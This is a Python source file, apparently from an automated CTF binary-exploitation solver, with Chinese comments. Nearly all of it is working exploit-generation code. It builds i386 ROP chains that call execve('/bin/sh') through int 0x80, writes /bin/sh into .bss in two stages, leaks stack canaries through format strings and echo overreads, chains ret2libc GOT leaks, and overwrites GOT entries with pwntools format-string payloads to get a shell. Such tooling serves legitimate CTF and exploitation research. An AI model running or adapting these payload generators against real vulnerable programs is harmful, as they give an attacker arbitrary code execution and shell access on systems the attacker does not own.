    """拼一条 execve("/bin/sh",0,0) 的 i386 ROP 链。

    需要 eax=11 / ebx=binsh / ecx=0 / edx=0；gadget 只需能覆盖这四个寄存器，
    且地址与取值打包后不能含坏字节（gets 遇 0x0a 会截断）。
    """
    want = {"eax": 11, "ebx": binsh, "ecx": 0, "edx": 0}
    int80 = _pick_addr(ch, f, sink, "int80", f.gadgets.get("int80"))
    if not int80 or not _pack_ok(ch, int80, sink):
        return None

    usable = {}
    for key, regs in GADGET_REGS.items():
        if ch.elf.bits == 64:
            continue
        addr = _pick_addr(ch, f, sink, key, f.gadgets.get(key))
        if addr and _pack_ok(ch, addr, sink):
            usable[key] = (addr, regs)
    if not usable:
        return None

    import itertools
    keys = list(usable)
    best = None
    for n in (1, 2, 3, 4):
        for combo in itertools.permutations(keys, n):
            covered = {}
            for k in combo:
                for r in usable[k][1]:
                    covered[r] = k
            if set(covered) != set(want):
                continue
            # 组合里每个 gadget 的寄存器都必须最终被正确赋值：由后往前覆盖检查
            ok = True
            for reg, val in want.items():
                if reg not in covered:
                    ok = False
                    break
            if not ok:
                continue
            # 构造 payload（同一寄存器可能被多次赋值，最后一次为准）
            blob = b""
            for k in combo:
                addr, regs = usable[k]
                blob += ch.p32(addr)
                for r in regs:
                    blob += ch.p32(want[r])
            blob += ch.p32(int80)
            if any(b in blob for b in _bad(ch, sink)):
                continue
            best = (combo, blob)
            break
        if best:
            break
    return best[1] if best else None


# --------------------------------------------------------------------------- 7. 32 位 ret2syscall
def s_ret2syscall(ch: Challenge, f: Facts) -> Iterable[Plan]:
    if ch.elf.bits != 32 or f.binsh is None:
        return
    g = f.gadgets
    if not all(k in g for k in ("pop_eax", "pop_ebx", "pop_edx", "int80")):
        return

    # 设置 ecx=0 & ebx=binsh 的几种写法
    setups = []
    if "pop_ecx" in g:
        setups.append([("pop_ecx", 0), ("pop_ebx", f.binsh)])
    if "pop_ecx_ebx" in g:
        setups.append([("pop_ecx_ebx", 0, f.binsh)])
    if "pop_ebx_ecx" in g:
        setups.append([("pop_ebx_ecx", f.binsh, 0)])
    if not setups:
        return

    for off, sink in _offsets(ch, f):
        chain = _i386_syscall_chain(ch, f, sink, f.binsh)
        if not chain:
            continue
        yield Plan("ret2syscall", [b"A" * off + chain + _term(sink)],
                   f"execve int80 off={off}")


def s_ret2syscall_write(ch: Challenge, f: Facts) -> Iterable[Plan]:
    """静态 32 位：二进制里没有 /bin/sh 时，先用 gets/read 把字符串写进 .bss，
    再回 main 触发第二次溢出，用 int 0x80 执行 execve。"""
    if ch.elf.bits != 32 or f.binsh is not None:
        return
    g = f.gadgets
    if not all(k in g for k in ("pop_eax", "pop_edx", "int80")):
        return
    writer = next((v for v in f.vulns if v.target and v.offset), None)
    main = ch.var("main")
    bss = _writable(ch)
    if not writer or not bss or not main:
        return
    setups = []
    if "pop_ecx_ebx" in g:
        setups.append([("pop_ecx_ebx", 0, bss)])
    if "pop_ecx" in g and "pop_ebx" in g:
        setups.append([("pop_ecx", 0), ("pop_ebx", bss)])
    for off, sink in _offsets(ch, f):
        clean_bss = _clean_bss(ch, sink, bss)
        if not clean_bss:
            continue
        chain = _i386_syscall_chain(ch, f, sink, clean_bss)
        if not chain:
            continue
        if not _pack_ok(ch, writer.target, sink) or not _pack_ok(ch, main, sink):
            continue
        stage1 = b"A" * off + ch.p32(writer.target) + ch.p32(main) + ch.p32(clean_bss)
        stage2 = b"A" * off + chain
        sends = [stage1 + _term(sink), b"/bin/sh\x00\n", stage2 + _term(sink)]
        yield Plan("ret2sys_write", sends,
                   f"gets({hex(clean_bss)}) -> main -> execve off={off}")


# --------------------------------------------------------------------------- 7b. canary + fmt 泄漏 + ret2libc
def s_canary_fmt(ch: Challenge, f: Facts) -> Iterable[Plan]:
    """`gets(buf); printf(buf); gets(buf);` 这类题：先用格式化字符串泄漏 canary，
    再溢出到 ret2libc（泄漏 GOT -> 回 main -> system）。"""
    if not f.fmt_buf or not ch.prot.canary or ch.elf.pie:
        return
    leak_plt = ch.plt("puts") or ch.plt("write")
    if not leak_plt:
        return
    got = ch.got("puts") or ch.got("write")
    main = ch.var("main")
    if not got or not main:
        return
    for off, sink in _offsets(ch, f):
        if sink not in TERM_SINKS and sink != "read":
            continue
        yield Plan("canary_fmt", [], tag=f"canary:{off}:{sink}",
                   desc=f"fmt leak canary -> ret2libc off={off}")


def _canary_candidates(out: bytes, bits: int) -> list[int]:
    """从 %p 回显里挑 canary 候选：低字节必须是 0x00。

    越靠后的参数越可能是 canary（canary 位于缓冲区之后的帧内），所以按索引倒序返回。
    """
    text = out.decode("latin-1", "ignore")
    vals = []
    indexed = []
    for idx, tok in enumerate(re.findall(r"0x[0-9a-fA-F]+", text)):
        try:
            v = int(tok, 16)
        except Exception:
            continue
        if v == 0 or (v & 0xFF) != 0:
            continue           # canary 最低字节固定为 0x00
        if bits == 32 and not (0x100 <= v <= 0xFFFFFFFF):
            continue
        # 64 位 canary 是满 64 位随机值（仅 LSB=00），不能用 2^56 上界排除——
        # 0x10.. 开头以外的 canary（15/16 概率）会被 2^56 误杀（cannary 实测）。
        # 栈地址 (<0x7f0000000000 之外的 0x7f 开头) 由 LSB!=0 自然排除。
        # 排除明显的栈/库/堆地址。注意【不能】用 v % 0x1000 == 0 排页对齐：
        # canary 低 12 位随机，1/16 概率恰好页对齐（cannary 实测 0x...a000 被误杀）
        if bits == 32 and (v >> 24) in (0xFF, 0xF7, 0xF6, 0x80, 0x08, 0x60):
            continue
        indexed.append((idx, v))
    indexed.sort(key=lambda x: -x[0])
    seen, out2 = set(), []
    for _, v in indexed:
        if v not in seen:
            seen.add(v)
            out2.append(v)
    return out2


# --------------------------------------------------------------------------- 8. printf(user) -> GOT 覆盖
def s_fmtstr(ch: Challenge, f: Facts) -> Iterable[Plan]:
    if not f.fmt_buf:
        return
    system = ch.plt("system")
    if not system:
        return
    targets = []
    for name in ("atoi", "strcmp", "strncmp", "strlen", "free", "exit"):
        g = ch.got(name)
        if g:
            targets.append((name, g))
    if not targets:
        return
    # 先探测格式化参数序号
    probe = b"AAAA." + b".%p" * 24 + b"\n"
    from .run import run_capture
    out = run_capture(ch, probe, timeout=1.0)
    idx = _fmt_offset(out)
    if not idx:
        return
    from pwn import fmtstr_payload
    for name, got in targets:
        for ws in ("short", "int"):
            try:
                blob = fmtstr_payload(idx, {got: system}, write_size=ws)
            except Exception:
                continue
            if b"\n" in blob:
                continue
            yield Plan("fmtstr", [blob + b"\n", b"/bin/sh\n"],
                       f"fmt {name}@got -> system@plt arg#{idx} write={ws}")


def _fmt_offset(out: bytes) -> Optional[int]:
    """从 %p 回显里定位 0x41414141 是第几个格式化参数（1-based）。"""
    text = out.decode("latin-1", "ignore")
    toks = re.findall(r"0x[0-9a-fA-F]+|\(nil\)", text)
    for i, tok in enumerate(toks, 1):
        low = tok.lower()
        if low.startswith("0x41414141") or low.endswith("41414141"):
            return i
    return None


# --------------------------------------------------------------------------- 辅助
def s_canary_echo(ch: Challenge, f: Facts) -> Iterable[Plan]:
    """canary + 「read 溢出 + puts(同 buf) 回显」结构（repeater 型）。

    泄 canary 的原理：发 buf_size+1 字节盖掉 canary 最低位的 0x00，
    puts 回显就会把 canary 高 7 字节带出来（LSB 在前重组）。
    拿到 canary 后走 ret2libc 三阶段（同进程）：泄漏 GOT → 重入 main → system。
    真正的执行在 orchestrator._try_canary_echo（泄漏值运行时才知道）。
    """
    if not ch.prot.canary or ch.elf.pie:
        return
    if f.echo_leak is None or ch.libc_elf is None:
        return
    leak_plt = ch.plt("puts")
    got = ch.got("puts")
    if not leak_plt or not got:
        return
    pop_rdi = f.gadgets.get("pop_rdi")
    if ch.elf.bits == 64 and not pop_rdi:
        return
    v = f.vulns[f.echo_leak[0]]
    if not v.func_entry:
        return
    yield Plan("canary_echo", [], tag=f"canaryecho:{v.offset}:{v.sink}",
               desc=f"echo-leak canary -> ret2libc off={v.offset} "
                    f"buf={f.echo_leak[1]} entry={hex(v.func_entry)}")


def _writable(ch: Challenge) -> Optional[int]:
    """挑一块可写内存（bss 起点往后一点，避开已用数据）。"""
    try:
        bss = ch.elf.bss()
    except Exception:
        return None
    # 跳过已存在的全局变量区，留 0x200 余量
    return bss + 0x200 if bss else None


STRATEGIES = [
    s_pie_partial_win,
    s_syscall_direct,
    s_syscall_execve,
    s_ret2win_pie,
    s_guard_write,        # v7.4.0：逻辑校验（输入直接满足判定条件）
    s_guard_fmt,          # v7.4.0：fmt 写全局门
    s_ret2win,
    s_ret2plt,
    s_ret2gets,
    s_ret2csu,
    s_global_write_win,   # v7.4.2：全局写 → 函数指针槽 → win
    s_guard_backfill,     # v7.4.0：strncmp 回填（只产出 gate 证据）
    s_canary_fmt,
    s_ret2libc_write,
    s_ret2libc,
    s_shellcode,
    s_ret2syscall,
    s_ret2syscall_write,
    s_canary_echo,
    s_fmtstr,
    # 兜底：只打 flag 的题（不计入 shell 成功率，单独记账）
    s_ret2win_flag,
    # 证据态：诱饵 win 只打 1 次，仅证明控制流到达（不记 SHELL/FLAG）
    s_ret2win_decoy,
]
